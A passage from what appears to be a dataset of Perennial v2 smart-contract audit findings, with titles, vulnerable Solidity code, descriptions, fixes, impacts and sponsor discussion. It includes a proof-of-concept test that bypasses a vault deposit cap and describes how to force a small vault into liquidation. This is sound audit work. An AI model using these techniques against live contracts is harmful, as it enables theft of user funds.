currentTimestamp) return;\n\n    versions[++_global.currentIndex] = currentTimestamp;\n    emit OracleProviderVersionRequested(currentTimestamp);\n\n    // @audit only the first request per version reaches these lines to add market+account to callback list\n    _globalCallbacks[currentTimestamp].add(address(market));\n    _localCallbacks[currentTimestamp][market].add(account);\n    emit CallbackRequested(SettlementCallback(market, account, currentTimestamp));\n}\n```\n\nAccording to docs, the same `KeeperOracle` can be used by multiple markets. And every account requesting in the same oracle version is supposed to be called back (settled) once the oracle version settles.чMove addition to callback list to just before the condition to exit function early:\n```\nfunction request(IMarket market, address account) external onlyAuthorized {\n    uint256 currentTimestamp = current();\n    _globalCallbacks[currentTimestamp].add(address(market));\n    _localCallbacks[currentTimestamp][market].add(account);\n    emit CallbackRequested(SettlementCallback(market, account, currentTimestamp));\n    if (versions[_global.currentIndex] == currentTimestamp) return;\n\n    versions[++_global.currentIndex] = currentTimestamp;\n    emit OracleProviderVersionRequested(currentTimestamp);\n}\n```\nчThe new core function of the protocol doesn't work as expected and `KeeperOracle` will fail to call back markets and accounts if there is more than 1 request in the same oracle version (which is very likely).\nCode Snippet\nTool used\nManual Review
`KeeperOracle.commit` will revert and won't work for all markets if any single `Market` is paused.чmediumч```\n/// @dev One instance per price feed should be deployed. Multiple products may use the same\n///      KeeperOracle instance if their payoff functions are based on the same underlying oracle.\n///      This implementation only supports non-negative prices.\n```\nчAccording to protocol design (from KeeperOracle comments), multiple markets may use the same KeeperOracle instance:\n```\n/// @dev One instance per price feed should be deployed. Multiple products may use the same\n///      KeeperOracle instance if their payoff functions are based on the same underlying oracle.\n///      This implementation only supports non-negative prices.\n```\n\nHowever, if `KeeperOracle` is used by several `Market` instances, and one of them makes a request and is then paused before the settlement, `KeeperOracle` will be temporarily bricked until `Market` is unpaused. This happens, because `KeeperOracle.commit` will revert in market callback, as `commit` iterates through all requested markets and calls `update` on all of them, and `update` reverts if the market is paused.\nThis means that pausing of just 1 market will basically stop trading in all the other markets which use the same `KeeperOracle`, disrupting protocol usage. When `KeeperOracle.commit` always reverts, it's also impossible to switch oracle provider from upstream `OracleFactory`, because provider switch still requires the latest version of previous oracle to be commited, and it will be impossible to commit it (both valid or invalid, requested or unrequested).\nAdditionally, the market's `update` can also revert for some other reasons, for example if maker exceeds the maker limit after invalid oracle as described in the other issue.\nAnd for another problem (although a low severity, but caused in the same lines), if too many markets are authorized to call `KeeperOracle.request`, the markets callback gas usage might exceed block limit, making it impossible to call `commit` due to not enough gas. Currently there is no limit of the amount of Markets which can be added to callback queue.\n`KeeperOracle.commit` calls back `update` in all markets which called `request` in the oracle version:\n```\nfor (uint256 i; i < _globalCallbacks[version.timestamp].length(); i++)\n    _settle(IMarket(_globalCallbacks[version.timestamp].at(i)), address(0));\n// rest of code\nfunction _settle(IMarket market, address account) private {\n    market.update(account, UFixed6Lib.MAX, UFixed6Lib.MAX, UFixed6Lib.MAX, Fixed6Lib.ZERO, false);\n}\n```\n\nIf any `Market` is paused, its `update` function will revert (notice the `whenNotPaused` modifier):\n```\n    function update(\n        address account,\n        UFixed6 newMaker,\n        UFixed6 newLong,\n        UFixed6 newShort,\n        Fixed6 collateral,\n        bool protect\n    ) external nonReentrant whenNotPaused {\n```\n\nThis means that if any `Market` is paused, all the other markets will be unable to continue trading since `commit` in their oracle provider will revert. It will also be impossible to successfully switch to a new provider for these markets, because previous oracle provider must still `commit` its latest request before fully switching to a new oracle provider:\n```\nfunction _latestStale(OracleVersion memory currentOracleLatestVersion) private view returns (bool) {\n    if (global.current == global.latest) return false;\n    if (global.latest == 0) return true;\n\n@@@ if (uint256(oracles[global.latest].timestamp) > oracles[global.latest].provider.latest().timestamp) return false;\n    if (uint256(oracles[global.latest].timestamp) >= currentOracleLatestVersion.timestamp) return false;\n\n    return true;\n}\n```\nчConsider catching and ignoring revert, when calling `update` for the market in the `_settle` (wrap in try .. catch).\nConsider adding a limit of the number of markets which are added to callback queue in each oracle version, or alternatively limit the number of authorized markets to call `request`.\nDiscussion\nkbrizzle\nMarkets are currently only pausable Factory-wide, which means this cannot happen unless there is a multi-MarketFactory setup pointing at the same Oracle instance.\nWhile valid, we currently do not support this usage pattern, and this would be among many improvements we'd need to make to.\npanprog\nThis issue is not limited to paused markets, but can happen for any reasons when market.update reverts, for example in the current codebase this can happen if maker exceeds makerLimit (issue #24), which will revert all update calls, subsequently bricking oracle update for all markets. This is mentioned in the issue description:\nAdditionally, the market's `update` can also revert for some other reasons, for example if maker exceeds the maker limit after invalid oracle as described in the other issue.\nI think this should be medium. It is still valid with paused markets (even if not considered supported setup by sponsor), but also valid if any other issue causes market to revert updates. This issue will make #24 more severe (#24 bricks 1 market, #26 makes it brick oracle commit and all markets using the same oracle)\nkbrizzle\nThanks for the additional color.\nWe'd like to preserve the guarantee that each posted price will atomically settle the attached market(s) (globally / async for locally) to that version. This is important for a number of parameter improvements and future upgrades we have planned.\nIf there are settlement-revert cases that are possible given this paradigm, we'd like to address those as if they are market-bricking issues.\nWe're open to however you think this is fair to judge on a severity basis, but we will only be resolving actual revert issues versus making the settlement callback `try...catch`.\npanprog\nThese are the planned future upgrades, but according to Sherlock rules it should be judged based on current code. In the current code there are no problems if market is not settled, but there are problems if due to some other issues (such as #24) the issue described here makes single market failure cause all the markets using the same oracle revert.\nI'd like to add that while multi-factory setup is not supported, multi markets (from the same factory) pointing to the same oracle instance is supported. So the following setup is supported:\nMarketFactory1 deploys Market1 and Market2\nOracleFactory1 deploys Oracle1\nMarket1 oracle is set to Oracle1 (say, it uses no payoff)\nMarket2 oracle is set to Oracle1 (say, it uses 2x payoff - so a 2x market for the same underlying oracle)\nIn such setup, if Market1 is paused, then Market2 is paused too (because they're paused via MarketFactory1, markets don't have pause function by themselves). However, if Market1 maker exceeds makerLimit due to #24, then not only Market1 is bricked (reverts all updates), but also both Oracle1 and Market2 are bricked too (revert all commit and update transactions).\nSo while most of this issue description is about pause function (since I didn't know about multi-factory setup not being supported), which can be considered invalid due to not being supported, the description also does mention the other reasons for the issue to happen, including making the maker > makerLimit issue more severe (possibly some other issues which can revert update too). So this part is valid, so I believe it should be mediumчOne paused market will stop trading in all the markets which use the same oracle provider (KeeperOracle).\nCode Snippet\nTool used\nManual Review
Vault `_maxDeposit` incorrect calculation allows to bypass vault deposit capчmediumч```\n    if (depositAssets.gt(_maxDeposit(context)))\n        revert VaultDepositLimitExceededError();\n// rest of code\nfunction _maxDeposit(Context memory context) private view returns (UFixed6) {\n    if (context.latestCheckpoint.unhealthy()) return UFixed6Lib.ZERO;\n    UFixed6 collateral = UFixed6Lib.from(totalAssets().max(Fixed6Lib.ZERO)).add(context.global.deposit);\n    return context.global.assets.add(context.parameter.cap.sub(collateral.min(context.parameter.cap)));\n}\n```\nч"Vault has a deposit cap risk setting, which is the max amount of funds users can deposit into the vault. The problem is that `_maxDeposit` function, which calculates max amount of assets allowed to be deposited is incorrect and always includes vault claimable assets even when the vault is at the cap. This allows malicious (or even regular) user to deposit unlimited amount bypassing the vault cap, if the vault has any assets redeemed but not claimed yet. This breaks the core protocol function which limits users risk, for example when the vault is still in the testing phase and owner wants to limit potential losses in case of any problems.\n`Vault._update` limits the user deposit to `_maxDeposit()` amount:\n```\n    if (depositAssets.gt(_maxDeposit(context)))\n        revert VaultDepositLimitExceededError();\n// rest of code\nfunction _maxDeposit(Context memory context) private view returns (UFixed6) {\n    if (context.latestCheckpoint.unhealthy()) return UFixed6Lib.ZERO;\n    UFixed6 collateral = UFixed6Lib.from(totalAssets().max(Fixed6Lib.ZERO)).add(context.global.deposit);\n    return context.global.assets.add(context.parameter.cap.sub(collateral.min(context.parameter.cap)));\n}\n```\n\nWhen calculating max deposit, the vault's collateral consists of vault assets as well as assets which are redeemed but not yet claimed. However, the formula used to calculate max deposit is incorrect, it is:\n`maxDeposit = claimableAssets + (cap - min(collateral, cap))`\nAs can be seen from the formula, regardless of cap and current collateral, maxDeposit will always be at least claimableAssets, even when the vault is already at the cap or above cap, which is apparently wrong. The correct formula should subtract claimableAssets from collateral (or 0 if claimableAssets is higher than collateral) instead of adding it to the result:\n`maxDeposit = cap - min(collateral - min(collateral, claimableAssets), cap)`\nCurrent incorrect formula allows to deposit up to claimable assets amount even when the vault is at or above cap. This can either be used by malicious user (user can deposit up to cap, redeem, deposit amount = up to cap + claimable, redeem, ..., repeat until target deposit amount is reached) or can happen itself when there are claimable assets available and vault is at the cap (which can easily happen by itself if some user forgets to claim or it takes long time to claim).\nBypass of vault cap is demonstrated in the test, add this to Vault.test.ts:\n```\nit('bypass vault deposit cap', async () => {\n    console.log(""start"");\n\n    await vault.connect(owner).updateParameter({\n    cap: parse6decimal('100'),\n    });\n\n    await updateOracle()\n\n    var deposit = parse6decimal('100')\n    console.log(""Deposit 100"")\n    await vault.connect(user).update(user.address, deposit, 0, 0)\n\n    await updateOracle()\n    await vault.settle(user.address);\n\n    var assets = await vault.totalAssets();\n    console.log(""Vault assets: "" + assets);\n\n    // additional deposit reverts due to cap\n    var deposit = parse6decimal('10')\n    console.log(""Deposit 10 revert"")\n    await expect(vault.connect(user).update(user.address, deposit, 0, 0)).to.be.reverted;\n\n    // now redeem 50\n    var redeem = parse6decimal('50')\n    console.log(""Redeem 50"")\n    await vault.connect(user).update(user.address, 0, redeem, 0);\n\n    await updateOracle()\n    await vault.settle(user.address);\n\n    var assets = await vault.totalAssets();\n    console.log(""Vault assets: "" + assets);\n\n    // deposit 100 (50+100=150) doesn't revert, because assets = 50\n    var deposit = parse6decimal('100')\n    console.log(""Deposit 100"")\n    await vault.connect(user).update(user.address, deposit, 0, 0);\n\n    await updateOracle()\n    await vault.settle(user.address);\n\n    var assets = await vault.totalAssets();\n    console.log(""Vault assets: "" + assets);\n\n    var deposit = parse6decimal('50')\n    console.log(""Deposit 50"")\n    await vault.connect(user).update(user.address, deposit, 0, 0);\n\n    await updateOracle()\n    await vault.settle(user.address);\n\n    var assets = await vault.totalAssets();\n    console.log(""Vault assets: "" + assets);\n})\n```\n\nConsole log from execution of the code above:\n```\nstart\nDeposit 100\nVault assets: 100000000\nDeposit 10 revert\nRedeem 50\nVault assets: 50000000\nDeposit 100\nVault assets: 150000000\nDeposit 50\nVault assets: 200000000\n```\n\nThe vault cap is set to 100 and is then demonstrated that it is bypassed and vault assets are set at 200 (and can be continued indefinitely)\nCode Snippet\nTool used\nManual Review"чThe correct formula to `_maxDeposit` should be:\n`maxDeposit = cap - min(collateral - min(collateral, claimableAssets), cap)`\nSo the code can be:\n```\nfunction _maxDeposit(Context memory context) private view returns (UFixed6) {\n    if (context.latestCheckpoint.unhealthy()) return UFixed6Lib.ZERO;\n    UFixed6 collateral = UFixed6Lib.from(totalAssets().max(Fixed6Lib.ZERO)).add(context.global.deposit);\n    return context.parameter.cap.sub(collateral.sub(context.global.assets.min(collateral)).min(context.parameter.cap));\n}\n```\nчMalicious and regular users can bypass vault deposit cap, either intentionally or just in the normal operation when some users redeem and claimable assets are available in the vault. This breaks core contract security function of limiting the deposit amount and can potentially lead to big user funds loss, for example at the initial stages when the owner still tests the oracle provider/market/etc and wants to limit vault deposit if anything goes wrong, but gets unlimited deposits instead.
Pending keeper and position fees are not accounted for in vault collateral calculation which can be abused to liquidate vault when it's smallчmediumч```\n// local\nLocal memory local = registration.market.locals(address(this));\ncontext.latestIds.update(marketId, local.latestId);\ncontext.currentIds.update(marketId, local.currentId);\ncontext.collaterals[marketId] = local.collateral;\n```\nчVault opens positions in the underlying markets trying to keep leverage at the level set for each market by the owner. However, it uses sum of market collaterals which exclude keeper and position fees. But pending fees are included in account health calculations in the `Market` itself.\nWhen vault TVL is high, this difference is mostly unnoticable. However, if vault is small and keeper fee is high enough, it's possible to intentionally add keeper fees by depositing minimum amounts from different accounts in the same oracle version. This keeps/increases vault calculated collateral, but its pending collateral in underlying markets reduces due to fees, which increases actual vault leverage, so it's possible to increase vault leverage up to maximum leverage possible and even intentionally liquidate the vault.\nEven when the vault TVL is not low but keeper fee is large enough, the other issue reported allows to set vault leverage to max (according to margined amount) and then this issue allows to reduce vault collateral even further down to maintained amount and then commit slightly worse price and liquidate the vault.\nWhen vault leverage is calculated, it uses collateral equal to sum of collaterals of all markets, loaded as following:\n```\n// local\nLocal memory local = registration.market.locals(address(this));\ncontext.latestIds.update(marketId, local.latestId);\ncontext.currentIds.update(marketId, local.currentId);\ncontext.collaterals[marketId] = local.collateral;\n```\n\nHowever, market's `local.collateral` excludes pending keeper and position fees. But pending fees are included in account health calculations in the `Market` itself (when loading pending positions):\n```\n    context.pendingCollateral = context.pendingCollateral\n        .sub(newPendingPosition.fee)\n        .sub(Fixed6Lib.from(newPendingPosition.keeper));\n// rest of code\n    if (protected && (\n        !context.closable.isZero() || // @audit-issue even if closable is 0, position can still increase\n        context.latestPosition.local.maintained(\n            context.latestVersion,\n            context.riskParameter,\n@@@         context.pendingCollateral.sub(collateral)\n        ) ||\n        collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n    )) revert MarketInvalidProtectionError();\n// rest of code\n    if (\n@@@     !context.currentPosition.local.margined(context.latestVersion, context.riskParameter, context.pendingCollateral)\n    ) revert MarketInsufficientMarginError();\n\n    if (\n@@@     !PositionLib.maintained(context.maxPendingMagnitude, context.latestVersion, context.riskParameter, context.pendingCollateral)\n    ) revert MarketInsufficientMaintenanceError();\n```\n\nThis means that small vault deposits from different accounts will be used for fees, but these fees will not be counted in vault underlying markets leverage calculations, allowing to increase vault's actual leverage.чConsider subtracting pending fees when loading underlying markets data context in the vault.чWhen vault TVL is small and keeper fees are high enough, it's possible to intentionally increase actual vault leverage and liquidate the vault by creating many small deposits from different user accounts, making the vault users lose their funds.\nCode Snippet\nTool used\nManual Review
`MultiInvoker._latest` will return `latestPrice = 0` when latest oracle version is invalid causing liquidation to send 0 fee to liquidator or incorrect order executionчmediumч```\nOracleVersion memory latestOracleVersion = market.oracle().latest();\nlatestPrice = latestOracleVersion.price;\nIPayoffProvider payoff = market.payoff();\nif (address(payoff) != address(0)) latestPrice = payoff.payoff(latestPrice);\n```\nчThere was a slight change of oracle versions handling in 2.1: now each requested oracle version must be commited, either as valid or invalid. This means that now the latest version can be invalid (price = 0). This is handled correctly in `Market`, which only uses timestamp from the latest oracle version, but the price comes either from latest version (if valid) or `global.latestPrice` (if invalid).\nHowever, `MultiInvoker` always uses price from `oracle.latest` without verifying if it's valid, meaning it will return `latestPrice = 0` if the latest oracle version is invalid. This is returned from the `_latest` function.\nSuch latest price = 0 leads to 2 main problems:\nLiquidations orders in MultiInvoker will send 0 liquidation fee to liquidator (will liquidate for free)\nSome TriggerOrders will trigger incorrectly (canExecuteOrder will return true when the real price didn't reach the trigger price, or false even if the real prices reached the trigger price)\n`MultiInvoker._latest` has the following code for latest price assignment:\n```\nOracleVersion memory latestOracleVersion = market.oracle().latest();\nlatestPrice = latestOracleVersion.price;\nIPayoffProvider payoff = market.payoff();\nif (address(payoff) != address(0)) latestPrice = payoff.payoff(latestPrice);\n```\n\nThis `latestPrice` is what's returned from the `_latest`, it isn't changed anywhere else. Notice that there is no check for latest oracle version validity.\nAnd this is the code for KeeperOracle._commitRequested:\n```\nfunction _commitRequested(OracleVersion memory version) private returns (bool) {\n    if (block.timestamp <= (next() + timeout)) {\n        if (!version.valid) revert KeeperOracleInvalidPriceError();\n        _prices[version.timestamp] = version.price;\n    }\n    _global.latestIndex++;\n    return true;\n}\n```\n\nNotice that commits made outside the timeout window simply increase `_global.latestIndex` without assigning `_prices`, meaning it remains 0 (invalid). This means that latest oracle version will return price=0 and will be invalid if commited after the timeout from request time has passed.\nPrice returned by `_latest` is used when calculating liquidationFee:\n```\nfunction _liquidationFee(IMarket market, address account) internal view returns (Position memory, UFixed6, UFixed6) {\n    // load information about liquidation\n    RiskParameter memory riskParameter = market.riskParameter();\n@@@ (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) = _latest(market, account);\n\n    // create placeholder order for liquidation fee calculation (fee is charged the same on all sides)\n    Order memory placeholderOrder;\n    placeholderOrder.maker = Fixed6Lib.from(closableAmount);\n\n    return (\n        latestPosition,\n        placeholderOrder\n@@@         .liquidationFee(OracleVersion(latestPosition.timestamp, latestPrice, true), riskParameter)\n            .min(UFixed6Lib.from(market.token().balanceOf(address(market)))),\n        closableAmount\n    );\n}\n```\n\n`liquidationFee` calculation in order multiplies order size by `latestPrice`, meaning it will be 0 when price = 0. This liquidation fee is then used in `market.update` for liquidation fee to receive by liquidator:\n```\n    function _liquidate(IMarket market, address account, bool revertOnFailure) internal isMarketInstance(market) {\n@@@     (Position memory latestPosition, UFixed6 liquidationFee, UFixed6 closable) = _liquidationFee(market, account);\n        Position memory currentPosition = market.pendingPositions(account, market.locals(account).currentId);\n        currentPosition.adjust(latestPosition);\n\n        try market.update(\n                account,\n                currentPosition.maker.isZero() ? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n                currentPosition.long.isZero() ? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n                currentPosition.short.isZero() ? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n@@@             Fixed6Lib.from(-1, liquidationFee),\n                true\n```\n\nThis means liquidator will receive 0 fee for the liquidation.\nIt is also used in canExecuteOrder:\n```\n    function _executeOrder(address account, IMarket market, uint256 nonce) internal {\n        if (!canExecuteOrder(account, market, nonce)) revert MultiInvokerCantExecuteError();\n// rest of code\n    function canExecuteOrder(address account, IMarket market, uint256 nonce) public view returns (bool) {\n        TriggerOrder memory order = orders(account, market, nonce);\n        if (order.fee.isZero()) return false;\n@@@     (, Fixed6 latestPrice, ) = _latest(market, account);\n@@@     return order.fillable(latestPrice);\n    }\n```\n\nMeaning `canExecuteOrder` will do comparision with price = 0 instead of real latest price. For example: limit buy order to buy when price <= 1000 (when current price = 1100) will trigger and execute buy at the price = 1100 instead of 1000 or lower.ч`_latest` should replicate the process for the latest price from `Market` instead of using price from the oracle's latest version:\nif the latest oracle version is valid, then use its price\nif the latest oracle version is invalid, then iterate all global pending positions backwards and use price of any valid oracle version at the position.\nif all pending positions are at invalid oracles, use market's `global.latestPrice`чliquidation done after invalid oracle version via `MultiInvoker` `LIQUIDATE` action will charge and send 0 liquidation fee from the liquidating account, thus liquidator loses these funds.\nsome orders with comparison of type -1 (<= price) will incorrectly trigger and will be executed when price is far from reaching the trigger price. This loses user funds due to unexpected execution price of the pending order.\nCode Snippet\nTool used\nManual Review
`MultiInvoker._latest` calculates incorrect closable for the current oracle version causing some liquidations to revertчmediumч```\n// load pending positions\nfor (uint256 id = context.local.latestId + 1; id < context.local.currentId; id++)\n    _processPendingPosition(context, _loadPendingPositionLocal(context, account, id));\n```\nч`closable` is the value calculated as the maximum possible position size that can be closed even if some pending position updates are invalidated due to invalid oracle version. There is one tricky edge case at the current oracle version which is calculated incorrectly in `MultiInvoker` (and also in Vault). This happens when pending position is updated in the current active oracle version: it is allowed to set this current position to any value conforming to `closable` of the previous pending (or latest) position. For example:\nlatest settled position = 10\nuser calls update(20) - pending position at t=200 is set to 20. If we calculate `closable` normally, it will be 10 (latest settled position).\nuser calls update(0) - pending position at t=200 is set to 0. This is valid and correct. It looks as if we've reduced position by 20, bypassing the `closable` = 10 value, but in reality the only enforced `closable` is the previous one (for latest settled position in the example, so it's 10) and it's enforced as a change from previous position, not from current.\nNow, if the step 3 happened in the next oracle version, so 3. user calls update(0) - pending position at t=300 will revert, because user can't close more than 10, and he tries to close 20.\nSo in such tricky edge case, `MultiInvoker` (and Vault) will calculate `closable = 10` and will try to liquidate with position = 20-10 = 10 instead of 0 and will revert, because `Market._invariant` will calculate `closable = 10` (latest = 10, pending = 10, closable = latest = 10), but it must be 0 to liquidate (step 3. in the example above)\nIn `Vault` case, this is less severe as the market will simply allow to redeem and will close smaller amount than it actually can.\nWhen `Market` calculates `closable`, it's calculated starting from latest settled position up to (but not including) current position:\n```\n// load pending positions\nfor (uint256 id = context.local.latestId + 1; id < context.local.currentId; id++)\n    _processPendingPosition(context, _loadPendingPositionLocal(context, account, id));\n```\n\nPay attention to `id < context.local.currentId` - the loop doesn't include currentId.\nAfter the current position is updated to a new user specified value, only then the current position is processed and closable now includes new user position change from the previous position:\n```\nfunction _update(\n    // rest of code\n    // load\n    _loadUpdateContext(context, account);\n    // rest of code\n    context.currentPosition.local.update(collateral);\n    // rest of code\n    // process current position\n    _processPendingPosition(context, context.currentPosition.local);\n    // rest of code\n    // after\n    _invariant(context, account, newOrder, collateral, protected);\n```\n\nThe `MultiInvoker._latest` logic is different and simply includes calculation of `closable` for all pending positions:\n```\nfor (uint256 id = local.latestId + 1; id <= local.currentId; id++) {\n\n    // load pending position\n    Position memory pendingPosition = market.pendingPositions(account, id);\n    pendingPosition.adjust(latestPosition);\n\n    // virtual settlement\n    if (pendingPosition.timestamp <= latestTimestamp) {\n        if (!market.oracle().at(pendingPosition.timestamp).valid) latestPosition.invalidate(pendingPosition);\n        latestPosition.update(pendingPosition);\n\n        previousMagnitude = latestPosition.magnitude();\n        closableAmount = previousMagnitude;\n\n    // process pending positions\n    } else {\n        closableAmount = closableAmount\n            .sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n        previousMagnitude = latestPosition.magnitude();\n    }\n}\n```\n\nThe same incorrect logic is in a Vault:\n```\n// pending positions\nfor (uint256 id = marketContext.local.latestId + 1; id <= marketContext.local.currentId; id++)\n    previousClosable = _loadPosition(\n        marketContext,\n        marketContext.currentAccountPosition = registration.market.pendingPositions(address(this), id),\n        previousClosable\n    );\n```\nчWhen calculating `closable` in `MultiInvoker` and `Vault`, add the following logic:\nif timestamp of pending position at index currentId equals current oracle version, then add the difference between position size at currentId and previous position size to `closable` (both when that position increases and decreases).\nFor example, if\nlatest settled position = `10`\npending position at t=200 = 20 then initialize `closable` to `10` (latest) add (pending-latest) = (20-10) to `closable` (closable = 20)\nDiscussion\nkbrizzle\nNote on fix: we will be removing the liquidation action from the MultiInvoker in another fix (as it will be unnecessary). we may or may not fix the vault side of the issue, since as you've laid out, it has minimal downside.\nkbrizzle\n`MultiInvoker` - Resolved as a side-effect of: https://github.com/equilibria-xyz/perennial-v2/pull/165.\n`Vault` - Won't fix due to the amount of additional complexity required, considering the low severity and expedient self-resolution.чIn the following edge case:\ncurrent oracle version = oracle version of the pending position in currentId index\nAND this (current) pending position increases compared to previous pending/settled position\nThe following can happen:\nliquidation via `MultiInvoker` will revert (medium impact)\nvault's `maxRedeem` amount will be smaller than actual allowed amount, position will be reduced by a smaller amount than they actually can (low impact)\nCode Snippet\nTool used\nManual Review
MultiInvoker closableAmount the calculation logic is wrongчmediumч```\n    function _processPendingPosition(Context memory context, Position memory newPendingPosition) private {\n        context.pendingCollateral = context.pendingCollateral\n            .sub(newPendingPosition.fee)\n            .sub(Fixed6Lib.from(newPendingPosition.keeper));\n          \n        context.closable = context.closable\n            .sub(context.previousPendingMagnitude\n                .sub(newPendingPosition.magnitude().min(context.previousPendingMagnitude)));\n      context.previousPendingMagnitude = newPendingPosition.magnitude();\n\n        if (context.previousPendingMagnitude.gt(context.maxPendingMagnitude))\n            context.maxPendingMagnitude = newPendingPosition.magnitude();\n    }\n```\nчin `MultiInvoker._latest()` The incorrect use of `previousMagnitude = latestPosition.magnitude()` has led to an error in the calculation of `closableAmount`. This has caused errors in judgments that use this variable, such as `_liquidationFee()`.\n```\n    function _processPendingPosition(Context memory context, Position memory newPendingPosition) private {\n        context.pendingCollateral = context.pendingCollateral\n            .sub(newPendingPosition.fee)\n            .sub(Fixed6Lib.from(newPendingPosition.keeper));\n          \n        context.closable = context.closable\n            .sub(context.previousPendingMagnitude\n                .sub(newPendingPosition.magnitude().min(context.previousPendingMagnitude)));\n      context.previousPendingMagnitude = newPendingPosition.magnitude();\n\n        if (context.previousPendingMagnitude.gt(context.maxPendingMagnitude))\n            context.maxPendingMagnitude = newPendingPosition.magnitude();\n    }\n```\n\nIt will loop through `pendingPostion`, and each loop will set the variable `context.previousPendingMagnitude = newPendingPosition.magnitude();` to be used as the basis for the calculation of the next `pendingPostion`.\n`closableAmount` is also calculated in `MultiInvoker._latest()`. The current implementation is as follows:\n```\n    function _latest(\n        IMarket market,\n        address account\n    ) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n        // load latest price\n        OracleVersion memory latestOracleVersion = market.oracle().latest();\n        latestPrice = latestOracleVersion.price;\n        IPayoffProvider payoff = market.payoff();\n        if (address(payoff) != address(0)) latestPrice = payoff.payoff(latestPrice);\n\n        // load latest settled position\n        uint256 latestTimestamp = latestOracleVersion.timestamp;\n        latestPosition = market.positions(account);\n        closableAmount = latestPosition.magnitude();\n        UFixed6 previousMagnitude = closableAmount;\n\n        // scan pending position for any ready-to-be-settled positions\n        Local memory local = market.locals(account);\n        for (uint256 id = local.latestId + 1; id <= local.currentId; id++) {\n\n            // load pending position\n            Position memory pendingPosition = market.pendingPositions(account, id);\n            pendingPosition.adjust(latestPosition);\n\n            // virtual settlement\n            if (pendingPosition.timestamp <= latestTimestamp) {\n                if (!market.oracle().at(pendingPosition.timestamp).valid) latestPosition.invalidate(pendingPosition);\n                latestPosition.update(pendingPosition);\n\n                previousMagnitude = latestPosition.magnitude();\n                closableAmount = previousMagnitude;\n\n            // process pending positions\n            } else {\n                closableAmount = closableAmount\n                    .sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n              previousMagnitude = latestPosition.magnitude();\n            }\n        }\n    }\n```\nч
interfaceFee Incorrectly converted uint40 when storedчmediumч```\nstruct StoredTriggerOrder {\n    /* slot 0 */\n    uint8 side;                // 0 = maker, 1 = long, 2 = short, 3 = collateral\n    int8 comparison;           // -2 = lt, -1 = lte, 0 = eq, 1 = gte, 2 = gt\n    uint64 fee;                // <= 18.44tb\n    int64 price;               // <= 9.22t\n    int64 delta;               // <= 9.22t\n  uint48 interfaceFeeAmount; // <= 281m\n\n    /* slot 1 */\n    address interfaceFeeReceiver;\n    bool interfaceFeeUnwrap;\n    bytes11 __unallocated0__;\n}\n\nlibrary TriggerOrderLib {\n    function store(TriggerOrderStorage storage self, TriggerOrder memory newValue) internal {\n        if (newValue.side > type(uint8).max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison > type(int8).max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison < type(int8).min) revert TriggerOrderStorageInvalidError();\n        if (newValue.fee.gt(UFixed6.wrap(type(uint64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.price.gt(Fixed6.wrap(type(int64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.price.lt(Fixed6.wrap(type(int64).min))) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta.gt(Fixed6.wrap(type(int64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta.lt(Fixed6.wrap(type(int64).min))) revert TriggerOrderStorageInvalidError();\n      if (newValue.interfaceFee.amount.gt(UFixed6.wrap(type(uint48).max))) revert TriggerOrderStorageInvalidError();\n\n        self.value = StoredTriggerOrder(\n            uint8(newValue.side),\n            int8(newValue.comparison),\n            uint64(UFixed6.unwrap(newValue.fee)),\n            int64(Fixed6.unwrap(newValue.price)),\n            int64(Fixed6.unwrap(newValue.delta)),\n          uint40(UFixed6.unwrap(newValue.interfaceFee.amount)),\n            newValue.interfaceFee.receiver,\n            newValue.interfaceFee.unwrap,\n            bytes11(0)\n        );\n    }\n```\nчThe `interfaceFee.amount` is currently defined as `uint48` , with a maximum value of approximately `281m`. However, it is incorrectly converted to `uint40` when saved, `uint40(UFixed6.unwrap(newValue.interfaceFee.amount))`, which means the maximum value can only be approximately `1.1M`. If a user sets an order where `interfaceFee.amount` is greater than `1.1M`, the order can be saved successfully but the actual stored value may be truncated to `0`. This is not what the user expects, and the user may think that the order has been set, but in reality, it is an incorrect order. Although a fee of `1.1M` is large, it is not impossible.\n`interfaceFee.amount` is defined as `uint48` the legality check also uses `type(uint48).max`, but `uint40` is used when saving.\n```\nstruct StoredTriggerOrder {\n    /* slot 0 */\n    uint8 side;                // 0 = maker, 1 = long, 2 = short, 3 = collateral\n    int8 comparison;           // -2 = lt, -1 = lte, 0 = eq, 1 = gte, 2 = gt\n    uint64 fee;                // <= 18.44tb\n    int64 price;               // <= 9.22t\n    int64 delta;               // <= 9.22t\n  uint48 interfaceFeeAmount; // <= 281m\n\n    /* slot 1 */\n    address interfaceFeeReceiver;\n    bool interfaceFeeUnwrap;\n    bytes11 __unallocated0__;\n}\n\nlibrary TriggerOrderLib {\n    function store(TriggerOrderStorage storage self, TriggerOrder memory newValue) internal {\n        if (newValue.side > type(uint8).max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison > type(int8).max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison < type(int8).min) revert TriggerOrderStorageInvalidError();\n        if (newValue.fee.gt(UFixed6.wrap(type(uint64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.price.gt(Fixed6.wrap(type(int64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.price.lt(Fixed6.wrap(type(int64).min))) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta.gt(Fixed6.wrap(type(int64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta.lt(Fixed6.wrap(type(int64).min))) revert TriggerOrderStorageInvalidError();\n      if (newValue.interfaceFee.amount.gt(UFixed6.wrap(type(uint48).max))) revert TriggerOrderStorageInvalidError();\n\n        self.value = StoredTriggerOrder(\n            uint8(newValue.side),\n            int8(newValue.comparison),\n            uint64(UFixed6.unwrap(newValue.fee)),\n            int64(Fixed6.unwrap(newValue.price)),\n            int64(Fixed6.unwrap(newValue.delta)),\n          uint40(UFixed6.unwrap(newValue.interfaceFee.amount)),\n            